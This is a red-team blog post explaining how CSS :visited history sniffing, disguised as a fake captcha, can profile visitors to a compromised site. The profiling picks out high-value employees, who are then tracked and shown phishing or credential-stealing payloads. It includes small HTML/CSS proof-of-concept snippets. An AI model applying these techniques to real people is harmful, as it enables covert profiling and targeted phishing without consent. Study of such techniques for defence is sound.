---
title: "Mixing watering hole attacks with history leak via CSS"
date: 2024-08-13 00:00:00 +00:00
modified: 2024-08-13 00:00:00 +00:00
tags: [red team, research, watering hole, phishing, CSS, CSS Leak, History Leak, X-C3LL]
description: Using CSS and social engineering to identify juicy targets when performing watering hole attacks
image: 
---


Dear Fell**owl**ship, today's homily is about one of the fields that we most rejoiced in when we were [youngsters](https://www.youtube.com/watch?v=CtEbPOOu-Bw) 15 years ago: client-side attacks and harmless information leaks. Please, take a seat and listen to the story.

# Prayers at the foot of the Altar a.k.a. disclaimer
*The first thing you need to be clear about when you read this article is that everything shown is old. Very old. But it's funny how technologies advance and people seem to forget how old techniques are still useful.*

*On the other hand, I often get the feeling that Red Team operators are disconnected from other areas such as client-side attacks because there is no direct benefit.*

*Mark my words: CSS will bring you more shells than C*

# Endtroducing

I am writing this post because the other night talking with Pepe Vila ([@cgvwzq](https://twitter.com/cgvwzq)) he passed me an article called [Encoding Differentials: Why Charset Matters](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters) where the author talk on how missing the **charset** attribute can lead to XSS. The article mentions the classic [XSS via UTF-7 on Google](https://seclists.org/fulldisclosure/2005/Dec/att-1107/google_xss_211205.txt) (2005) and then put the focus on **ISO-2022-JP** and how it can be abused in the same way. The thing is... this is not new. 

[Masato Kigunawa](https://twitter.com/kinugawamasato) used this trick in the past to [bypass XSS Auditor](https://issues.chromium.org/issues/40731832) (*If you remember when Chrome adopted XSS auditor you are bald or have grey hair at this moment*) and generic XSS filters when charset was missing (also documented in his [Browser's XSS Filter Bypass Cheat Sheet](https://https://github.com/masatokinugawa/filterbypass/wiki/Browser%27s-XSS-Filter-Bypass-Cheat-Sheet#iso-2022-jp%E3%81%AE%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9%E3%81%AE%E5%88%A9%E7%94%A8)). Don't take me wrong: ~10 years ago everyone who was interested in client-side attacks knew about this and other techniques. For example, it was the solution for various challenges (e.g. the [XSSMas Challenge from 2014](https://github.com/cure53/XSSChallengeWiki/wiki/XSSMas-Challenge-2014)).

As a result of this conversation, we began to philosophise about how certain knowledge is the niche of an era and certain technologies, and how in the end it is erased by the erosion of time. And we were remembering good old articles for client-side attacks, like the ones related to history leaks in browsers.

# Midnight in a perfect world

"History sniffing" was a privacy issue in the 00's because you could detect which websites a user visited based on how the style of a link (**`<a>`** element) changed. [All browsers around 2010](https://blog.mozilla.org/security/2010/03/31/plugging-the-css-history-leak/) disabled most of the style attributes that can be applied to a visited link and avoided the use of **`getComputedStyle()`** from JavaScript. After that people had to rely on side-channels like time-based differences or user interaction. And in this second category we find intersting stuff like [@lcamtuf](https://twitter.com/lcamtuf)'s [Whack-a-Mole](https://lcamtuf.coredump.cx/whack/) from 2016 or [HistoryTrack](https://github.com/bnadarevic/HistoryTrack) from bnadarevic. At this moment you would be probably wondering why all this stuff could be interesting for a Red Team. 

One of the main issues we face when deploying watering hole attacks is the specificity of who you want to attack. Discriminating between users coming from the corporate network and those who are merely visitors is easy as you can obtain the IP and compare it with the web logs (in case they have a CMS type system) or against the AS identified during the OSINT phase. Within the people coming from the corporate network it is even possible to identify which browser to attack (e.g. if you want to drop a payload that displays a less alarming message in a certain browser) or the geolocation (based on time and language). But you cannot be sure whether you are interacting with an extremely limited user (a mere telephone assistant) or someone very interesting because he can give you access to several administration platforms.

On the other hand, when part of your objectives are related to cloud infrastructure, it is interesting to target a user who has access to GCP, AWS or Azure. 

Also is important to do not go "Hail Mary" and spread your payloads to all the employees who visits the website because then the odds to be revealed are increased. Every time you ask the user to install a "configuration file for proxy configuration", introduce a device code disguised as Captcha, or just a mere credential stealer, the odds to be reported are increased. The more surgical the performance, the longer you can go unnoticed.

Did you connect the dots?

# Organ Donor

Heres is when leaking webpages visited by the user is interesting. Because we can check if the user visited GCP or Azure portals, ServiceNow, a Github repo, etc. Even if we performed a good OSINT reserach we can know the existence of internal platforms that we would like to compromise in our engagement. So attacking only users that are "juicy" based on their browser history is pretty neat method to narrow the target list. As our code would be running inside a webpage that is trusted by default (hence why I love watering hole attacks - the success ratio is 100%) if we ask the user for an interaction he would not suspect anything. Small interaction like solving a captcha **:)**

The idea is to triage the users that are employees (we check the IP) with the browses and OS we are intersted in. We will show a captcha to these users and the solution will reveal which one visited "juicy" stuff; also we mark all of them with a tracker via `LocalStorage` so it can survive between sessions. Once we analyzed the list of users, we will show our payload (download a file, device code with a pretext, redirect to a reverse-proxy like EvilNginx, or whatever we want) only to the interesting users (we can aim at them using the tracking).

The most basic thing we can do is play with the color of non-visited links to match the background, so the user will only see characters from websites that he visited previously.

```html
<html>
<style>
body {
  font-family: 'Roboto';
  background-color: black;
  color: white;
}
a:visited {
  color: white;
}
a {
  color: black;
}
</style>
<a href="https://adepts.of0x.cc">A</a>
<a href="https:/asdfasdfasdfa.com/fake">1</a>
<a href="https://never-visited">B</a>
<a href="https://github.com">2</a>
<a href="https://github.com/fake">k</a>
</html>
```

In my case we can see the chars "A" and "2" because I visited these two websites. 
<figure>
<img src="/CSS-History-LEAKS/leak01.png" alt="Some characters are shown because I visited these websites"> 
<figcaption>
Some characters are shown because I visited these websites.
</figcaption>
</figure>

Problem is: you can see the rest of the text by selecting it with the mouse. 

<figure>
<img src="/CSS-History-LEAKS/leak02.png" alt="Selecting text reveals our trick"> 
<figcaption>
Selecting text reveals our trick.
</figcaption>
</figure>

It can be solved playing a bit with the CSS so the text can not be selected **;D**
```html
<html>
<style>
body {
  font-family: 'Roboto';
  background-color: black;
}
div {
	  -webkit-user-select: none;
  user-select: none;
  pointer-events: none;
  cursor: default;
}
a:visited {
  color: white;
}
a {
  color: black;
}

</style>
<div>
<a href="https://adepts.of0x.cc">A</a>
<a href="https://github.com/fake">1</a>
<a href="https://never-visited">B</a>
<a href="https://github.com">2</a>
<a href="https://github.com/fake">k</a>
</div>
</html>
```

As a quick an dirty PoC I just played also with position of each "canary" character so it looks more realistic (ignore my lack of CSS skills)
<figure>
<img src="/CSS-History-LEAKS/leak03.png" alt="Innocent captcha"> 
<figcaption>
Innocent captcha.
</figcaption>
</figure>

With JavaScript you can generate the characters and positions randomly, so it looks more like a captcha and avoid repeating the same pattern to all the users. Also, add links to stuff that the user visited for sure to avoid showing an empty captcha.


# EoF
We hope you enjoyed this reading! Feel free to give us feedback at our twitter [@AdeptsOf0xCC](https://twitter.com/AdeptsOf0xCC).





